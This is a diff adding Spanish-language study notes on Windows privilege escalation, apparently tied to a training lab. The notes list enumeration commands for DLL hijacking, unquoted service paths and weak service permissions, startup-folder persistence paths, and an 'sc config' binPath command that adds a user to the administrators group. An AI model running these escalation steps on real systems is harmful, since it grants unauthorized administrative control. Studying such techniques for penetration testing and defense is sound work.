@@ -1,0 +1,65 @@
+EXPLOTACION WINDOWS - ESCALA DE PRIVILEGIOS Y OTROS
+
+ DDL HIJAKING
+wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\windows\\"
+icacls "C:\Program Files\DLL Hijack Service" - METODO printspoofer
+ $env:Path -split ";" - METODO Phanton DLL
+
+BUSCAR FUNCIONES Y DATOS DE UNA DLL, TENIENDO VISUALSTUDUIO INSTALADO.
+CMD PARA DESARROLADORES
+dumpbin /EXPORTS C:\Temp\hijackme.dll
+
+UNQUORE_PATH_SERVICE
+wmic service get name,displayname,startmode,pathname |findstr /i /v "C:\Windows\\" |findstr /i /v """  - BUSCA ARCHIVOS O RUTAS SIN COMILLAS
+
+VER LOS SERVICIOS Y RUTAS DE EJECUCION EN WINDOWS (POWERSHELL)
+Get-WmiObject win32_service | Select-Object Name, PathName | Where-Object { $_.PathName -like "* *" -and $_.PathName -notlike '"*"' }
+COMPROBAR SERVICIOS SIN COMILLAS Y CON ESPACIOS
+Get-WmiObject win32_service | Where-Object { $_.PathName -like "* *" -and $_.PathName -notmatch '^".*"$' -and $_.PathName -notlike "*Windows*" -and $_.PathName -notlike "*Program Files (x86)*" } | Select-Object Name, PathName
+
+
+COMANDOS VARIOS
+BUSQUEDA GENERAL DE FICHERO VULNERAVLES EN WINDOWS SIN C WINDOWS
+wmic service get name,displayname,startmode,pathname |findstr /i /v "C:\Windows\\"
+
+- chkdsk / f, / r, / x, / BC:, este comando corrige los errores, recupera datos, desmonta la unidad o borrar la lista de sectores defectuosos.
+- D. caché checker: comando funcione el CMD debe ejecutarse como administrador para seguidamente poner sfc /scannow. Si encuentra archivos corruptos los sustituirá por copias de la caché de Windows.
+-extensiones como ipconfig /release segudo de ipconfig /renew para conseguir que Windows te asigne otra dirección IP distinta a la que tienes. Además, con ipcofig /flushdns conseguirás actualizar tu dirección DNS.
+-con Assoc podremos ver todas estas asociaciones PROGRAMAS CON ARCHIVOS.
+Observaremos una lista de las extensiones de archivo y cuál es programa asociado a cada uno de ellos. Incluso tendremos la oportunidad de cambiar alguna asociación si escribimos, por ejemplo, assoc .txt= y después del igual le ponemos el programa con el que debe abrirla.
+-  .\accesschk64.exe -q -s -f *.dll "C:\" user -nobanner -v
+
+Este comando:
+
+    -q: Suprime la salida de objetos sin acceso.
+    -s: Hace una búsqueda recursiva en subdirectorios.
+    -f *.dll: Filtra los resultados para mostrar solo archivos .dll.
+    "C:\": Especifica el directorio de inicio.
+    user: Especifica que quieres ver los permisos del usuario user.
+    -nobanner: Oculta el mensaje de copyright y la información inicial.
+    -v: Muestra salida detallada de los permisos.
+
+
+EXPLOTACION WINDOIWS 2 - SERVICIOS MASL CONFIGURADOS
+
+Get-WmiObject win32_service | Where-Object { $_.PathName -notlike "C:\Windows\*" } | Select-Object Name, DisplayName, PathName, StartMode
+
+FILE PERMISSON SERVICES
+- para saber los servicios
+wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\windows\\"
+- conocer que servicio es el elegido, hay que ir 1 a 1
+.\accesschk64.exe -wuvc -sc "daclsvc" -accepteula
+Conocer la ruta de un sergvicio
+ C:\Windows\System32\sc.exe qc 'daclsvc' ( sc qc 'servicio') pero si no funciona sc con la ruta absoluta
+- tambieon se puede miarar con este comando:
+wmic service where "name='daclsvc'" get pathname
+
+finalmente para modificar la configuración del servicio vulnerable
+C:\Windows\System32\sc.exe config daclsvc binPath= "net localgroup administrators vagrant /add"
+finalmente si todo bien., pone un mensaje todo correcto y agrega el iuusaurio a administrador
+
+STARTUP OTHERS
+
+C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\
+C:\Users\<NombreUsuario>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
+
